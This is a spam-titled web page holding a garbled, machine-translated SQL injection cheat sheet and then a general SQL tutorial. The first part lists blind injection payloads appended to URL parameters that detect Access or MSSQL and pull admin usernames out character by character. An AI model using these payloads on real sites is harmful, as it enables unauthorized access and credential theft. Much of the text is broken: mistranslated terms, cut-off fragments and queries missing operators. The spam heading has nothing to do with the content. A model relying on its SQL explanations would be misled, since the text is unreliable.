gucci belt Quick to learn, understand. SQL injection

Quick to learn, understand. SQL injection  Editor: admin Date :2005-8-10   test whether injection   1 = 1 (normal pages)   1 = 2 (error page)   Checklist section    0.1/xx? id = 11and exists (select * from admin)   detection field    exists (select username from admin)   detection ID    exists (select id from admin where ID = 1)   detection length    exists (select id from admin where len (username) = 5 and ID = 1)    detection length    exists (select id from admin where len (username) = 5 and ID = 1)   detect whether the MSSQL database    exists (select * from sysobjects)   detect in English   (ACCESS database)   / xx? id = 11and exists (select id from admin where asc (mid (username, 1,1)) between 30 and 130 and ID = 1)   (MSSQL database)  http:// 127.0.0.1/xx? id = 11and exists (select id from admin where unicode (substring (username, 1,1)) between 30 and 130 and ID = 1)   detection range of English   (ACCESS database)   exists (select id from admin where asc (mid (username, 1,,1)) between 90 and 100 and ID = 1)   (MSSQL database)   exists (select id from admin where unicode (substring (username, 1,1)) between 90 and 100 and ID = 1)   determine which characters   (ACCESS database)   exists (select id from admin where asc (mid (username, 1,1)) = 97 and ID = 1)   (MSSQL database)   exists (select id from admin where unicode (substring (username , 1,1)) = 97 and ID = 1)   common functions   Access: asc (character) SQLServer: unicode (character)  role: a character's ASCII code return   Access: chr (number) SQLServer: nchar (Digital)  role: with the asc On the contrary,, the character ASCII code returned   Access: mid (string, N, L) SQLServer : substring (string, N, L)  effects: returns the string starting from the N-character substring of length L, N to N + L is the string between   Access: abc (Digital) SQLServer: abc (Digital)  function: Returns the absolute value (when the guess solution will be used Chinese characters)   Access: A between B And C SQLServer: A between B And C  role: to determine whether the community in A between B and C   and exists (Select top 1 * From Users order by id)    1. in the query results display column names:  a. using as keywords: select name as 'Name' from students order by age  b. Direct,, said: select name 'Name' from students order by age   2 . Exact Match:  a. limited range of use in: select * from students where native in ('Hunan', 'Sichuan')  b.between ... and: select * from students where age between 20 and 30  c. \that is part of the match, but also has information in it, that is, find the \Lee, should be to '_ LI%' or '_ Lee' or '_ Li _'.)  e. [] match check character: select * from courses where cno like '[AC]%' (express or relationship, and \br> 3. For the time types of variables handle  a.smalldatetime: string processed by way of direct processing, such as: select * from students where birth> = '1980-1-1 'and birth  1    6.UNION United  combined results, such as :  SELECT * FROM students WHERE name like 'Photo%' UNION [ALL] SELECT * FROM students WHERE name like 'Li%'    7.  a. within the multi-table query Connect  select g.sno, s.name, c.coursename from grades g JOIN students s ON g.sno = s.sno JOIN courses c ON g.cno = c.cno  (Note that you can refer to an alias)  b. outer join  b1. LEFT JOIN  select courses.cno, max (coursename), count (sno) from courses LEFT JOIN grades ON courses.cno = grades.cno group by courses.cno  LEFT JOIN characteristics: Show all left the table all the items, even though some items of data are not filled out completely.   left outer join returns those present in the left and right table rows in the table did not, together with the connecting lines.  b2. the right and left connection connection  similar  b3. fully connected  select sno, name, major from students FULL JOIN majors ON students.mno = majors.mno  both sides of the table Show all the contents of their connection  c.  select c1.cno, c1.coursename, c1.pno, c2.coursename from courses c1, courses c2 where c1.pno = c2.cno  solve the problem using the alias .  d. AC * connection  select lastname + firstname from lastname CROSS JOIN firstanme  do the equivalent of the Cartesian product    8.  a. use a nested query keyword IN, such as query Pig Hill Association:  select * from students where native in (select native from students where name = 'Pig')  b. Use keywords EXIST, for example, the following two are equivalent:  select * from students where sno in (select sno from grades where cno = 'B2')   select * from students where exists (select * from grades where grades.sno = students . sno AND cno = 'B2')    9. on the sort order  a. For the sort order, there are two ways: asc desc ascending and descending  b. For sort order, you can query in accordance with an order, but this can be expressed in figures, such as:  select sno, count (*),, avg (mark) from grades group by sno having avg (mark)> 85 order by 3   10. Other  a. Identification of the name for a space, should be used \ b. no data in a column for a particular query can be null judgments, such as select sno, courseno from grades where mark IS NULL  c. a distinction used in the nested query any and all of the difference between any logical operation is equivalent to \Students:  select students .* from students, grades where students.sno = grades.sno AND grades.cno  'B2'  way above query is wrong, the correct way to see the bottom:  select * from students where not exists (select * from grades where grades.sno = students.sno AND cno = 'B2')   11. on the difficult thinking of multiple nested query resolved: for example,, All students enrolled:  select * from students where not exists (select * from courses where NOT EXISTS (select * from grades where sno = students.sno AND cno = courses.cno))  the most important outside of a : selected from the student table, excluding those who have not chosen course. By not exist. As the subject for discussion of the course, so the second re-query to find the table from the course, excluding those who chose the course you can.